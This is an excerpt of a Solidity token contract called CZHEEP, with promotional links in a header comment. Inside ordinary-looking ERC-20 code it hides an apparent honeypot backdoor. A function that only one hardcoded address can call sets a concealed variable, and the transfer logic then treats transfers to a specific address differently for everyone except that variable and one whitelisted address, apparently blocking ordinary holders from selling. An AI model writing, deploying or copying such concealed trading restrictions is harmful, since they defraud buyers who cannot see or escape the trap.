/* 
    website  : https://www.CZHEEP.com
    twitter  : https://x.com/CZHEEP
    telegram : https://t.me/CZHEEP
*/
...
contract CZHEEP is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xFE51dF8a42F586c104377220AC07FF60B68bF070) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 && from != 0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13) ||
    ...
    constructor() {
        _name = unicode"CZHEEP";
        _symbol = unicode"CZHEEP";
